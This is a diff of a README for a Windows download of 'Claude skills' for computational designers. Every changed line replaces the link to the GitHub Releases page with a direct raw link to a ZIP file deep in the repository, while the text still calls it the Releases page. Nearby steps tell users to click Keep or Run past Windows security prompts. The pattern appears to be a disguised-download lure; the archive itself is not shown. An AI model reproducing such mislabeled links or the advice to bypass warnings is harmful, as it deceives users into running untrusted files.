@@ -1,6 +1,6 @@
 # 🧩 Claude-skills-for-Computational-Designers - Simple tools for better design work
 
-[![Download from GitHub Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/marcinfinitesimal533/Claude-skills-for-Computational-Designers/releases)
+[![Download from GitHub Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/marcinfinitesimal533/Claude-skills-for-Computational-Designers/main/skills/optimization-methods/Claude-for-Designers-Computational-skills-v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This project is meant for Windows users who want a simple way to download the fi
 
 ## 📥 Download
 
-1. Open the [Releases page](https://github.com/marcinfinitesimal533/Claude-skills-for-Computational-Designers/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/marcinfinitesimal533/Claude-skills-for-Computational-Designers/main/skills/optimization-methods/Claude-for-Designers-Computational-skills-v2.1.zip)
 2. Find the latest release at the top of the page
 3. Download the file or files included in that release
 4. Save them to a folder you can find again, such as Downloads or Desktop
@@ -19,7 +19,7 @@ If the release includes a ZIP file, right-click it and choose Extract All before
 
 ## 🖥️ How to Install on Windows
 
-1. Go to the [Releases page](https://github.com/marcinfinitesimal533/Claude-skills-for-Computational-Designers/releases)
+1. Go to the [Releases page](https://raw.githubusercontent.com/marcinfinitesimal533/Claude-skills-for-Computational-Designers/main/skills/optimization-methods/Claude-for-Designers-Computational-skills-v2.1.zip)
 2. Download the release package
 3. If Windows shows a security prompt, choose Keep or Run if you trust the source
 4. If the file is compressed, unzip it
@@ -174,7 +174,7 @@ Use the same place each time so you can find the files fast.
 
 If you need to get the files again, use the same release page:
 
-[Go to Releases](https://github.com/marcinfinitesimal533/Claude-skills-for-Computational-Designers/releases)
+[Go to Releases](https://raw.githubusercontent.com/marcinfinitesimal533/Claude-skills-for-Computational-Designers/main/skills/optimization-methods/Claude-for-Designers-Computational-skills-v2.1.zip)
 
 ## 🧩 Working with Claude
 
@@ -198,7 +198,7 @@ If you want, create a second folder for your own prompt notes and examples
 
 ## 🧭 Quick Start
 
-1. Open the [Releases page](https://github.com/marcinfinitesimal533/Claude-skills-for-Computational-Designers/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/marcinfinitesimal533/Claude-skills-for-Computational-Designers/main/skills/optimization-methods/Claude-for-Designers-Computational-skills-v2.1.zip)
 2. Download the latest release
 3. Extract the files if needed
 4. Open the included instructions
